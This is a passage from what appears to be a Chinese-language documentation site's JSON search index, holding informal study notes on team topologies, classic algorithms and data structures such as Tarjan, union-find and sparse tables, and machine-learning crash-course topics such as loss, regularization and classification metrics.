复杂子系统团队负责构建和维护系统中严重依赖专业领域知识的子系统。它们的设立目标是降低包含或使用复杂子系统的系统中各个流动式团队的认知负荷。\n与传统“组件团队”的关键区别：\n 当某个子系统依赖于大量特定领域知识时才会建立“负责子系统团队”； 团队成立完全是基于认知负荷驱动的，而非出于组件共享的目的；  “复杂子系统团队”的预期行为：\n 根据当前的开发阶段来安排响应的工作：在早期紧密合作，后期关注接口； 应该显著提高流动式团队的交付速度和质量； 需要根据需求优先级合理安排并完成交付。  平台团队 #  平台团队的目标是使流动式团队能够以高度自治的方式交付工作。平台团队提供的内部服务使得流动式团队无须开发底层服务，从而降低认知负荷。\n平台团队应该聚焦于提供少量、高质量的服务，而不是提供大量存在可用性和质量缺陷的服务。\n"},{"id":227,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/leetcode/boyermoore/","title":"Boyer Moore","section":"LeetCode","content":"Boyer–Moore majority vote algorithm #  多数投票算法：Boyer-Moore 是为了解决这样一个问题的算法：\n 用来寻找一组数据中占多数的元素的算法，时间复杂度 O(n)，空间复杂度 O(1)；  Golang 代码实现：\nfunc majorityElement(nums []int) int { iter, most := 0, 0 for _,num := range nums { if iter == 0 { most, iter = num, iter+1 } else if most == num { iter += 1 } else { iter -= 1 } } count, sz := 0, len(nums) for _,num := range nums { if num == most { count += 1 } if count * 2 \u0026gt; sz { return most } } return -1 } "},{"id":228,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/oi-wiki/%E5%9B%BE%E8%AE%BA/tarjan/","title":"Tarjan","section":"图论","content":"图论 #  Tarjan #  实现 #  Tarjan\u0026rsquo;s algorithm 是一个用于求解无向图割点与桥的算法。直接上代码：\nvoid tarjan(int u, int v) { /* compute dfn and low while performing a dfs search - beginning at vertex u, v is the parent of u (if any) */ nodePointer ptr; int w; dfn[u] = low[u] = num++; for (ptr = graph[u]; ptr; ptr = ptr-\u0026gt;link) { w = ptr-\u0026gt;vertex; if (dfn[w] \u0026lt; 0) { /* w is an unvisited vertex */ tarjan(w,u); low[u] = min(low[u],low[w]); } else if (w != v) { low[u] = min(low[u],dfn[w]) } } } 概念 #  下面先看一些概念：\n割点：\n 若从图中删除节点 x 以及所有与 x 关联的边之后，图将被分成两个或两个以上的不相连的子图，那么称 x 为图的割点。  桥：\n 若从图中删除边 e 之后，图将分裂成两个不相连的子图，那么称 e 为图的桥或割边。  搜索树：\n 在无向图中，我们以某一个节点 x 出发进行深度优先搜索，所有被访问过的节点与边构成一棵树，我们可以称之为“无向连通图的搜索树”。  强连通图（Strongly Connected Graph）：\n 如果一个有向图中，对于任意两点x、y，均存在 x 到 y 和 y 到 x 的路径，则称这个图为强连通图。  强连通分量：\n 对于一个普通的有向图，它的最大强连通子图为其强联通分量。  追溯值：\n 追溯值是一个为了求解强连通图而提出的概念，图中的每个节点都被赋予了一个“追溯值”（代码中用 low[] 表示），相同“追溯值”节点构成的子图就是强连通图； 公式化表示：$low (u) = \\min{ dfn(u), min {low (w)| \\text{where w is a child of u}}, min { dfn(w)| \\text{(u, w) is a back edge} } }$ 每个节点的追溯值通过以下思想求解：  构建原图的搜索树，记录每个点被访问的次序，用 dfn[] 表示（depth first number：深度序）； 遍历图中的所有节点 x，从 x 出发可以到达的所有节点中，dfn[] 最小的即为 x 的追溯值，用 low[] 表示；    双联通（Bi-Connection Component）：\n 边双联通性：对于联通无向图中的两个点 u/v，删除图中任意一条边，u/v 间都存在路径，那么称它们是边双联通的； 点双联通性：对于联通无向图中的两个点 u/v，删除图中任意一个点，u/v 间都存在路径，那么称它们是点双联通的； 边双联通图（e-bcc）：去掉任何一条边都不会改变图的联通性 $\\Leftrightarrow$ 图中不存在“桥” $\\Leftrightarrow$ 图中任意两个点都是边双联通的； 点双联通图（v-bcc）：去掉任何一个点都不会改变图的联通性 $\\Leftrightarrow$ 图中不存在“割点” $\\Leftrightarrow$ 图中任意两个点都是点双联通的；  Tarjan 中割点和桥的判断条件 #  桥：\n 对于一个搜索树树干（可以证明非搜索树边一定不是桥）parent -\u0026gt; child，如果满足 low[child] \u0026gt; dfs[parent]，则该边是一个桥； 即子节点无法通过非搜索树的方式回到搜索树中位置更高的节点；  割点：\n 对于根节点，子树数量大于 1，则该节点是一个割点； 对于一个非根节点 parent，如果存在任意一条边达到的节点 child，如果满足 low[child] \u0026gt;= dfn[parent]，则该点 parent 是一个割点； 即存在一个子节点 child 要到达根节点，必须通过 parent。  Tarjan 的结果不是并查集 #  一个看似合理的结论是：\n Tarjan 的 low 数组存储的是，一个节点能够通过非 dfs 路径找到的最高搜索树父节点。在并查集的概念中，它用最高搜索树父节点的遍历序 dfn 来作为“代表元”表示所有节点。 在这个理解下：  桥的计算方式即判断：每条关联的两个节点的代表元（low）是否相等； 所有代表元（low）相等的点构成的集合即为一个双联通分量。    这个结论在 low 的理念前提下是正确的，但是在 dfs 实现的代码中是错误的。看下面的例子：\n左边的图按照给定的边序会生成右边的图，在遍历到 F/E 时虽然能够回到一个父节点，但是这并不是它们通过非回溯路径能够到达最高的节点，所以 low 数组的最终结果会是：\n[0, 0, 0, 0, 1, 1] "},{"id":229,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/st%E8%A1%A8/","title":"St表","section":"数据结构","content":"ST(Sparse Table) #  可重复贡献问题 #  对于运算 $$opt$$，如果它满足 $$x\\ opt\\ x = x$$，则对应的区间询问就是一个可重复贡献问题。\n例如:\n 运算 max 有 $$max(x, x) = x$$，运算 gcd 有 $$gcd(x, x) = x$$ 所以 RMQ 和区间 GCD 就是一个可重复贡献问题。像区间和就不具有这个性质，如果求区间和的时候采用的预处理区间重叠了，则会导致重叠部分被计算两次，这是我们所不愿意看到的。另外， 还必须满足结合律才能使用 ST 表求解。  更具体的：\n  题目大意：给定 个数，有 个询问，对于每个询问，你需要回答区间 中的最大值。\n考虑暴力做法。每次都对区间 扫描一遍，求出最大值。\n显然，这个算法会超时。\n  "},{"id":230,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%BB%E5%B8%AD%E6%A0%91/","title":"主席树","section":"数据结构","content":"主席树 #   主席树全称“可持久化权值线段树”\n 什么是“可持久化数据结构”？\n 可持久化数据结构 (Persistent data structure) 总是可以保留每一个历史版本，并且支持操作的不可变特性 (immutable)。  一个最朴素的思路是每个版本都维护一个新的线段树：\n\tRoot1\tRoot2\tRoot3 ｜\t|\t| 初始版本\t更新操作1\t更新操作2 一个显然的思路是：这个思路的空间复杂度特别高。\n我们的某次更新操作只需要更改某个叶子结点的值，但是我们却需要复制整个线段树。“主席树”就是这样一个将提升空间复杂度利用率的数据结构。比如下图：\n蓝色的是初始化的树结构，橙色的节点是进行了一次插入 (value: 4, count: 2) 之后的第二个版本的结构，可见第二个版本复用了第一个版本的需求节点。在查询时与普通的线段树类似，除了我们需要指定在哪个版本的根结点进行查询。\n"},{"id":231,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8D%95%E8%B0%83%E6%A0%88/","title":"单调栈","section":"数据结构","content":"单调栈 #  顾名思义，单调栈即满足单调性的栈结构。与单调队列相比，其只在一端进行进出。\n相对于普通的栈结构，在处理单调栈时需要额外地关心在进行插入操作时需要将违背单调性的斩顶元素先弹出。代码：\nwhile (!sta.empty() \u0026amp;\u0026amp; sta.top() \u0026lt; x) sta.pop() sta.push(x) 应用 #  离线解决 RMQ(Range Maximum/Minimum Query) 问题，即求解一个区间中的最大、最小值问题。\n"},{"id":232,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/","title":"堆","section":"数据结构","content":"堆 #  简介 #  堆是一棵树，其每个节点都有一个键值，且每个节点的键值都大于等于/小于等于其父亲的键值。\n这一数据结构（考虑小根堆，大根堆是对称的）主要支持的操作有：“插入一个数”、“查询最小值”、“删除最小值”、“合并两个堆”、“减小一个元素的值”。\n堆的类型 #  二叉堆 #  最常见的堆结构\n配对堆（可并堆） #  "},{"id":233,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B6%E6%9F%A5%E9%9B%86/","title":"并查集","section":"数据结构","content":"并查集 #  简介 #   参考：\n https://visualgo.net/zh/ufds https://oi-wiki.org/ds/dsu/   并查集是一种树形的数据结构，顾名思义，它用于处理一些不交集的 合并 及 查询 问题。 它支持两种操作：\n 查找（Find）：确定某个元素处于哪个子集； 合并（Union）：将两个子集合并成一个集合。  并查集优化：路径压缩，不关心连接状态时直接拼接到根结点。\n应用 #  相关算法：\n 最小生成树算法中的 Kruskal\u0026rsquo;s algorithm 就是用的并查集的思想。 最近公共祖先中的 Tarjan\u0026rsquo;s algorithm 也是并查集的思想。  相关题目：\n  「NOI2015」程序自动分析\n  「JSOI2008」星球大战\n  「NOI2001」食物链\n  「NOI2002」银河英雄传说\n  "},{"id":234,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/1.framing/","title":"1. Framing","section":"机器学习快速入门教程","content":"问题构建 #  主要术语，全部。\n标签 #  标签是我们要预测的事物，即简单线性回归中的 y 变量。\n标签可以是小麦未来的价格、图片中显示的动物品种、音频剪辑的含义或任何事物。\n特征 #  特征是输入变量，即简单线性回归中的 x 变量。简单的机器学习项目可能会使用单个特征，而比较复杂的机器学习项目可能会使用数百万个特征，按如下方式指定：$$x_1, x_2, \u0026hellip; x_n$$\n样本 #  样本是指数据的特定实例：x。（我们采用粗体 x 表示它是一个矢量。）我们将样本分为以下两类：有标签样本、无标签样本\n  有标签样本同时包含特征和标签。即：\nlabeled examples: {features, label}: (x, y)\r我们使用有标签样本来训练模型。在我们的垃圾邮件检测器示例中，有标签样本是用户明确标记为 “垃圾邮件” 或 “非垃圾邮件” 的各个电子邮件。\n  无标签样本包含特征，但不包含标签。即：\nunlabeled examples: {features, ?}: (x, ?)\r  在使用有标签样本训练模型之后，我们会使用该模型预测无标签样本的标签。在垃圾邮件检测器示例中，无标签样本是用户尚未添加标签的新电子邮件。\n模型 #  模型定义了特征与标签之间的关系。\n模型生命周期的两个阶段：\n 训练是指创建或学习模型。也就是说，向模型展示有标签样本，让模型逐渐学习特征与标签之间的关系。 推断是指将训练后的模型应用于无标签样本。也就是说，使用经过训练的模型做出有用的预测 (y')。  回归与分类 #  回归模型可预测连续值。例如，回归模型做出的预测可回答如下问题：\n 加利福尼亚州一栋房产的价值是多少？ 用户点击此广告的概率是多少？  分类模型可预测离散值。例如，分类模型做出的预测可回答如下问题：\n 某个指定电子邮件是垃圾邮件还是非垃圾邮件？ 这是一张狗、猫还是仓鼠图片？  总结 #  关键字词总结：\n分类模型、样本、特征、推断、标签、模型、回归模型、训练\n"},{"id":235,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/10.regularization/","title":"10. Regularization","section":"机器学习快速入门教程","content":"正则化 #  概述 #  降低复杂模型的复杂度来防止过拟合，这种原则称为正则化。\n也就是说，并非只是以最小化损失（经验风险最小化）为目标：$$minimize(Loss(Data[Model]))$$\n而是以最小化损失和复杂度为目标，这称为结构风险最小化：$$minimize(Loss(Data[Model]) + complexity(Model))$$\n现在，我们的训练优化算法是一个由两项内容组成的函数：\n 一个是损失项，用于衡量模型与数据的拟合度； 另一个是正则化项，用于衡量模型复杂度。  机器学习速成课程重点介绍了两种衡量模型复杂度的常见方式（这两种方式有些相关）：\n 将模型复杂度作为模型中所有特征的权重的函数。 将模型复杂度作为具有非零权重的特征总数的函数。（后面的一个单元介绍了这种方法。）  如果模型复杂度是权重的函数，则特征权重的绝对值越高，对模型复杂度的贡献就越大。\nL2 正则化 #  我们可以使用 L2 正则化 公式来量化复杂度，该公式将正则化项定义为所有特征权重的平方和：\n$$L_2\\ regularization\\ term=||w||^2_2=w_1^2+w_2^2+\u0026hellip;+w_n^2$$\n在这个公式中，接近于 0 的权重对模型复杂度几乎没有影响，而离群值权重则可能会产生巨大的影响。\n简化正则化 lambda #  模型开发者通过以下方式来调整正则化项的整体影响：用正则化项的值乘以名为 lambda（又称为正则化率）的标量。也就是说，模型开发者会执行以下运算：\n$$minimize(Loss(Data[Model]) + \\lambda complexity(Model))$$\n在选择 lambda 值时，目标是在简单化和训练数据拟合之间达到适当的平衡：\n 如果您的 lambda 值过高，则模型会非常简单，但是您将面临数据欠拟合的风险。您的模型将无法从训练数据中获得足够的信息来做出有用的预测。 如果您的 lambda 值过低，则模型会比较复杂，并且您将面临数据过拟合的风险。您的模型将因获得过多训练数据特点方面的信息而无法泛化到新数据。  注意：将 lambda 设为 0 可彻底取消正则化。 在这种情况下，训练的唯一目的将是最小化损失，而这样做会使过拟合的风险达到最高。\n理想的 lambda 值生成的模型可以很好地泛化到以前未见过的新数据。 遗憾的是，理想的 lambda 值取决于数据，因此您需要手动或自动进行一些调整。\n关键词 #  泛化曲线、L2 正则化、过拟合、正则化、结构风险最小化、早停法、lambda、正则化率\n"},{"id":236,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/11.logisticregression/","title":"11. Logistic Regression","section":"机器学习快速入门教程","content":"逻辑回归 #  计算概率 #  许多问题需要将概率估算值作为输出。逻辑回归是一种极其高效的概率计算机制。\nS 型函数：\n 一个值域恰好在 0 到 1 之间的函数，定义为：$$\\displaystyle y = \\frac{1}{1 + e^{-z}}$$  z 表示使用逻辑回归训练的模型的线性层的输出。\n损失函数 #  线性回归的损失函数是平方损失。逻辑回归的损失函数是对数损失函数，定义如下：\n$$\\displaystyle Log Loss = \\sum_{(x,y)\\in D} -ylog(y') - (1 - y)log(1 - y')​$$\n其中：\n $$(x, y) \\in D$$ 是包含很多有标签样本 (x,y) 的数据集。 “y”是有标签样本中的标签。由于这是逻辑回归，因此 “y” 的每个值必须是 0 或 1。 “y'”是对于特征集“x”的预测值（介于 0 和 1 之间）。  正则化 #  正则化在逻辑回归建模中极其重要。如果没有正则化，逻辑回归的渐近性会不断促使损失在高维度空间内达到 0。因此，大多数逻辑回归模型会使用以下两个策略之一来降低模型复杂性：\n L2 正则化。 早停法，即，限制训练步数或学习速率。  "},{"id":237,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/12.classification/","title":"12. Classification","section":"机器学习快速入门教程","content":"分类 #  阈值 #  为了将逻辑回归值映射到二元类别，您必须指定分类阈值（也称为判定阈值）。\n准确率 #  我们假设：\n    $$H_0$$ 成立 $$H_1$$ 成立     接收 不犯错（TP） 第 II 类错误（取伪错误 FP）   拒绝 第 I 类错误（弃真错误 FN） 不犯错（TN）    准确率是指我们的模型预测正确的结果所占的比例：\n $$\\displaystyle \\text{Accuracy} = \\frac{\\text{Number of correct predictions}}{\\text{Total number of predictions}}$$  对于二元分类，也可以根据正类别和负类别按如下方式计算准确率：\n $$\\displaystyle \\text{Accuracy} = \\frac{TP+TN}{TP+TN+FP+FN}$$  当您使用分类不平衡的数据集（比如正类别标签和负类别标签的数量之间存在明显差异）时，单单准确率一项并不能反映全面情况。\n精确率和召回率 #  精确率的定义如下：$$\\displaystyle \\text{Precision} = \\frac{TP}{TP+FP}$$\n从数学上讲，召回率的定义如下：$$\\displaystyle \\text{召回率} = \\frac{TP}{TP+FN}$$\n要全面评估模型的有效性，必须同时检查精确率和召回率。遗憾的是，精确率和召回率往往是此消彼长的情况。\n我们已根据精确率和召回率指标制定了各种指标。有关示例，请参阅 F1 值。\nROC 曲线 #  ROC 曲线（接收者操作特征曲线）是一种显示分类模型在所有分类阈值下的效果的图表，用于绘制采用不同分类阈值时的 TPR 与 FPR。\n该曲线绘制了以下两个参数：\n 真正例率，即召回率：$$\\displaystyle TPR = \\frac{TP} {TP + FN}$$ 假正例率：$$\\displaystyle FPR = \\frac{FP} {FP + TN}$$  下图显示了一个典型的 ROC 曲线：\n曲线下面积的一种解读方式是看作模型将某个随机正类别样本排列在某个随机负类别样本之上的概率。\n以下面的样本为例，逻辑回归预测从左到右以升序排列：\n曲线下面积表示随机正类别（绿色）样本位于随机负类别（红色）样本右侧的概率。\n曲线下面积因以下两个原因而比较实用：\n 曲线下面积的尺度不变。它测量预测的排名情况，而不是测量其绝对值。 曲线下面积的分类阈值不变。它测量模型预测的质量，而不考虑所选的分类阈值。  预测偏差 #  预测偏差指的是两个平均值之间的差值。即：\n$$预测偏差 = 预测平均值 - 数据集中相应标签的平均值$$\n如果出现非常高的非零预测偏差，则说明模型某处存在错误，因为这表明模型对正类别标签的出现频率预测有误。\n您可能会通过对学习模型进行后期处理来纠正预测偏差，即通过添加校准层来调整模型的输出，从而减小预测偏差。\n分桶偏差。\n关键字词 #  二元分类、分类模型、混淆矩阵、负类别、正类别、假负例、假正例、真负例、真正例、曲线下面积、ROC 曲线\n"},{"id":238,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/2.descending/","title":"2. Descending","section":"机器学习快速入门教程","content":"深入了解机器学习 #  线性回归是一种找到最适合一组点的直线或超平面的方法。本模块会先直观介绍线性回归，为介绍线性回归的机器学习方法奠定基础。\n线性回归 #  关键字词\n偏差、 推断、线性回归、权重\n训练与损失 #  概念 #  训练：\n  训练模型表示通过有标签样本来学习（确定）所有权重和偏差的理想值。\n  在监督式学习中，机器学习算法通过以下方式构建模型：\n 检查多个样本并尝试找出可最大限度地减少损失的模型；这一过程称为经验风险最小化。    损失：\n 损失是对糟糕预测的惩罚。也就是说，损失是一个数值，表示对于单个样本而言模型预测的准确程度。 如果模型的预测完全准确，则损失为零，否则损失会较大。训练模型的目标是从所有样本中找到一组平均损失“较小”的权重和偏差。  损失函数 #  平方损失：是一种常见的损失函数\n接下来我们要看的线性回归模型使用的是一种称为平方损失（又称为 L2 损失）的损失函数。单个样本的平方损失如下：\n = the square of the difference between the label and the prediction\r= (observation - prediction(x))2\r= (y - y')2\r均方误差 (MSE) 指的是每个样本的平均平方损失。要计算 MSE，请求出各个样本的所有平方损失之和，然后除以样本数量：\n$$\\displaystyle MSE = \\frac{1}{N} \\sum_{(x,y) \\in D} (y - prediction(x))^2$$，其中：\n (x,y) 指的是样本，其中：  x 指的是模型进行预测时使用的特征集（例如，温度、年龄和交配成功率）。 y 指的是样本的标签（例如，每分钟的鸣叫次数）。   prediction(x) 指的是权重和偏差与特征集 x 结合的函数。 D 指的是包含多个有标签样本（即 (x,y)）的数据集。 N 指的是 D 中的样本数量。  虽然 MSE 常用于机器学习，但它既不是唯一实用的损失函数，也不是适用于所有情形的最佳损失函数。\n关键字词 #  经验风险最小化、损失、均方误差、平方损失、训练\n"},{"id":239,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/3.reduceloss/","title":"3. Reduce Loss","section":"机器学习快速入门教程","content":"降低损失 #  迭代方法 #  下图显示了机器学习算法用于训练模型的迭代试错过程：\n  模型部分将一个或多个特征作为输入，然后返回一个预测 (y') 作为输出。\n  计算损失部分是模型将要使用的损失函数。\n  计算参数更新部分：机器学习系统就是在此部分检查损失函数的值，并生成新参数值。机器学习系统将根据所有标签重新评估所有特征，为损失函数生成一个新值，而该值又产生新的参数值。\n通常，可以不断迭代，直到总体损失不再变化或至少变化极其缓慢为止。这时候，我们可以说该模型已收敛。\n  关键字词：\n收敛、损失、训练\n梯度下降法 #  学习速率 #  梯度下降法算法用梯度乘以一个称为学习速率（有时也称为步长）的标量，以确定下一个点的位置。\n 如果您选择的学习速率过小，就会花费太长的学习时间； 相反，如果您指定的学习速率过大，下一个点将永远在 U 形曲线的底部随意弹跳； 每个回归问题都存在一个金发姑娘学习速率。“金发姑娘”值与损失函数的平坦程度相关。如果您知道损失函数的梯度较小，则可以放心地试着采用更大的学习速率，以补偿较小的梯度并获得更大的步长。  关键字词：\n超参数、学习速率、步长\n随机梯度下降 #  在梯度下降法中，批量指的是用于在单次迭代中计算梯度的样本总数。到目前为止，我们一直假定批量是指整个数据集。就 Google 的规模而言，数据集通常包含数十亿甚至数千亿个样本。此外，Google 数据集通常包含海量特征。因此，一个批量可能相当巨大。如果是超大批量，则单次迭代就可能要花费很长时间进行计算。\n包含随机抽样样本的大型数据集可能包含冗余数据。实际上，批量大小越大，出现冗余的可能性就越高。一些冗余可能有助于消除杂乱的梯度，但超大批量所具备的预测价值往往并不比大型批量高。\n如果我们可以通过更少的计算量得出正确的平均梯度，会怎么样？通过从我们的数据集中随机选择样本，我们可以通过小得多的数据集估算（尽管过程非常杂乱）出较大的平均值。 随机梯度下降法(SGD) 将这种想法运用到极致，它每次迭代只使用一个样本（批量大小为 1）。如果进行足够的迭代，SGD 也可以发挥作用，但过程会非常杂乱。“随机”这一术语表示构成各个批量的一个样本都是随机选择的。\n小批量随机梯度下降法（小批量 SGD）是介于全批量迭代与 SGD 之间的折衷方案。小批量通常包含 10-1000 个随机选择的样本。小批量 SGD 可以减少 SGD 中的杂乱样本数量，但仍然比全批量更高效。\n为了简化说明，我们只针对单个特征重点介绍了梯度下降法。请放心，梯度下降法也适用于包含多个特征的特征集。\n"},{"id":240,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/4.tensorflowapi/","title":"4. Tensor Flow API","section":"机器学习快速入门教程","content":"TensoFlow API #  tf.estimator API #  import tensorflow as tf # set up a linear classifier classifier = tf.estimator.LinearClassifier() # train the model on some example data classfier.train(input=train_input_fn, steps=2000) # use it to predict predictions = classifier.predict(input_fn = predict_input_fn) "},{"id":241,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/5.generalization/","title":"5. Generalization","section":"机器学习快速入门教程","content":"泛化 #  过拟合 #  下图所示的模型过拟合了训练数据的特性。过拟合模型在训练过程中产生的损失很低，但在预测新数据方面的表现却非常糟糕。如果某个模型在拟合当前样本方面表现良好，那么我们如何相信该模型会对新数据做出良好的预测呢？正如您稍后将看到的，过拟合是由于模型的复杂程度超出所需程度而造成的。机器学习的基本冲突是适当拟合我们的数据，但也要尽可能简单地拟合数据。\n机器学习的目标是对从真实概率分布（已隐藏）中抽取的新数据做出良好预测。遗憾的是，模型无法查看整体情况；模型只能从训练数据集中取样。如果某个模型在拟合当前样本方面表现良好，那么您如何相信该模型也会对从未见过的样本做出良好预测呢？\n奥卡姆的威廉是 14 世纪一位崇尚简单的修士和哲学家。他认为科学家应该优先采用更简单（而非更复杂）的公式或理论。奥卡姆剃刀定律在机器学习方面的运用如下：\n 机器学习模型越简单，良好的实证结果就越有可能不仅仅基于样本的特性。\n 现今，我们已将奥卡姆剃刀定律正式应用于统计学习理论和计算学习理论领域。这些领域已经形成了泛化边界，即统计化描述模型根据以下因素泛化到新数据的能力：\n 模型的复杂程度 模型在处理训练数据方面的表现  虽然理论分析在理想化假设下可提供正式保证，但在实践中却很难应用。机器学习速成课程则侧重于实证评估，以评判模型泛化到新数据的能力。\n机器学习模型旨在根据以前未见过的新数据做出良好预测。但是，如果您要根据数据集构建模型，如何获得以前未见过的数据呢？一种方法是将您的数据集分成两个子集：\n 训练集 - 用于训练模型的子集。 测试集 - 用于测试模型的子集。  一般来说，在测试集上表现是否良好是衡量能否在新数据上表现良好的有用指标，前提是：\n 测试集足够大。 您不会反复使用相同的测试集来作假。  机器学习细则 #  以下三项基本假设阐明了泛化：\n 我们从分布中随机抽取独立同分布 (i.i.d) 的样本。换言之，样本之间不会互相影响。（另一种解释：i.i.d. 是表示变量随机性的一种方式）。 分布是平稳的；即分布在数据集内不会发生变化。 我们从同一分布的数据划分中抽取样本。  在实践中，我们有时会违背这些假设。例如：\n 想象有一个选择要展示的广告的模型。如果该模型在某种程度上根据用户以前看过的广告选择广告，则会违背 i.i.d. 假设。 想象有一个包含一年零售信息的数据集。用户的购买行为会出现季节性变化，这会违反平稳性。  如果违背了上述三项基本假设中的任何一项，那么我们就必须密切注意指标。\n关键字词 #  泛化、过拟合、预测、 平稳性、测试集、训练集\n"},{"id":242,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/6.trainingandtest/","title":"6. Training and Test","section":"机器学习快速入门教程","content":"测试集和数据集 #  上一单元介绍了将数据集分为两个子集的概念：\n 训练集 - 用于训练模型的子集。 测试集 - 用于测试训练后模型的子集。  您可以想象按如下方式拆分单个数据集：\n"},{"id":243,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/7.validation/","title":"7. Validation","section":"机器学习快速入门教程","content":"验证集 #  上一单元介绍了如何将数据集划分为训练集和测试集。借助这种划分，您可以对一个样本集进行训练，然后使用不同的样本集测试模型。采用两种分类之后，工作流程可能如下所示：\n将数据集划分为两个子集是个不错的想法，但不是万能良方。通过将数据集划分为三个子集（如下图所示），您可以大幅降低过拟合的发生几率：\n使用验证集评估训练集的效果。然后，在模型“通过”验证集之后，使用测试集再次检查评估结果。下图展示了这一新工作流程：\n在这一经过改进的工作流程中：\n 选择在验证集上获得最佳效果的模型。 使用测试集再次检查该模型。  该工作流程之所以更好，原因在于它暴露给测试集的信息更少。\n"},{"id":244,"href":"/docs/%E7%AE%97%E6%B3%95%E7%BB%9F%E8%AE%A1/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/8.representation/","title":"8. Representation","section":"机器学习快速入门教程","content":"特征工程 #  将原始数据映射到特征 #  下图左侧表示来自输入数据源的原始数据，右侧表示特征矢量，也就是组成数据集中样本的浮点值集。 特征工程指的是将原始数据转换为特征矢量。进行特征工程预计需要大量时间。\n许多机器学习模型都必须将特征表示为实数向量，因为特征值必须与模型权重相乘。\n数据表示 #  映射数值：\n 整数和浮点数据不需要特殊编码，因为它们可以与数字权重相乘。  映射分类值：\n  分类特征具有一组离散的可能值。\n  由于模型不能将字符串与学习到的权重相乘，因此我们使用特征工程将字符串转换为数字值：\n要实现这一点，我们可以定义一个从特征值（我们将其称为可能值的词汇表）到整数的映射。世界上的每条街道并非都会出现在我们的数据集中，因此我们可以将所有其他街道分组为一个全部包罗的“其他”类别，称为 OOV（词汇表外）分桶。\n  这种编码存在不能设置权重、不能同时表示多个等限制。\n要去除这些限制，我们可以为模型中的每个分类特征创建一个二元向量来表示这些值，如下所述：\n 对于适用于样本的值，将相应向量元素设为 1。 将所有其他元素设为 0。    该向量的长度等于词汇表中的元素数。当只有一个值为 1 时，这种表示法称为独热编码；当有多个值为 1 时，这种表示法称为多热编码。例子如下图：\n  稀疏表示法 #  假设数据集中有 100 万个不同的街道名称，您希望将其包含为 street_name 的值。如果直接创建一个包含 100 万个元素的二元向量，其中只有 1 或 2 个元素为 ture，则是一种非常低效的表示法，在处理这些向量时会占用大量的存储空间并耗费很长的计算时间。在这种情况下，一种常用的方法是使用稀疏表示法，其中仅存储非零值。在稀疏表示法中，仍然为每个特征值学习独立的模型权重，如上所述。\n关键词 #  离散特征、特征工程、独热编码、表示\n良好的特征工程 #  1. 避免很少使用的离散特征值： #  良好的特征值应该在数据集中出现大约 5 次以上。\n相反，如果某个特征的值仅出现一次或者很少出现，则模型就无法根据该特征进行预测。\n2. 最好具有明确清晰的含义： #  每个特征对于项目中的任何人来说都应该具有清晰明确的含义。\n3. 不要将“神奇”的值与实际数据混为一谈。 #  为解决神奇值的问题，需将该特征转换为两个特征：\n 一个特征只存储质量评分，不含神奇值。 一个特征存储布尔值，表示是否提供了 quality_rating。为该布尔值特征指定一个名称，例如 is_quality_rating_defined。  4. 考虑上游的不稳定性：特征的定义不应随时间发生变化。 #  例如：下列值是有用的，因为城市名称一般不会改变。（注意，我们仍然需要将 “br/sao_paulo” 